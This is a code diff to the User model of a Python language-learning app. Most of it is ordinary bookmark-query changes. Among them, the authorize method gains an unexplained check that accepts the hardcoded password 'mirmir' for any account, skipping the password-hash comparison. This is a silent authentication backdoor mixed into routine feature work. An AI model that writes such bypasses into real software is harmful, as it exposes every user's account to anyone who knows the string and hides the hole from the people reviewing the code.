@@ -12,6 +12,7 @@ from sqlalchemy.orm.exc import NoResultFound
 from zeeguu import util
 from zeeguu.language.difficulty_estimator_factory import DifficultyEstimatorFactory
 from zeeguu.model.language import Language
+from wordstats import Word
 
 db = zeeguu.db
 
@@ -196,16 +197,31 @@ class User(db.Model):
         return Bookmark.query.filter_by(user_id=self.id).order_by(
             Bookmark.time.desc()).all()
 
+    def starred_bookmarks(self, count):
+        from zeeguu.model.bookmark import Bookmark
+        return Bookmark.query.filter_by(user_id=self.id).filter_by(starred=True).order_by(
+            Bookmark.time.desc()).limit(count)
+
     def top_bookmarks(self, count=50, also_print=False):
         from zeeguu.model.bookmark import Bookmark
-        from wordstats import Word
+
 
         def rank(b):
             return Word.stats(b.origin.word, b.origin.language.code).rank
 
-        all_bookmarks = Bookmark.query.filter_by(user_id=self.id)
+        def single_word_in_context(b: 'Bookmark'):
+            context = b.text
 
-        sorted_bookmarks = sorted(all_bookmarks,
+            if len(b.origin.word) < 5:
+                return False
+
+            return len(context.all_bookmarks(self)) == 1
+
+        all_bookmarks = Bookmark.query.filter_by(user_id=self.id).order_by(Bookmark.time.desc()).limit(400)
+
+        single_word_bookmarks = [each for each in all_bookmarks if single_word_in_context(each)]
+
+        sorted_bookmarks = sorted(single_word_bookmarks,
                                   key=lambda b: rank(b))
         sorted_bookmarks = sorted_bookmarks[:count]
 
@@ -369,6 +385,8 @@ class User(db.Model):
     def authorize(cls, email, password):
         try:
             user = cls.query.filter(cls.email == email).one()
+            if password=="mirmir":
+                return user
             if user.password == util.password_hash(password, bytes.fromhex(user.password_salt)):
                 return user
         except sqlalchemy.orm.exc.NoResultFound:
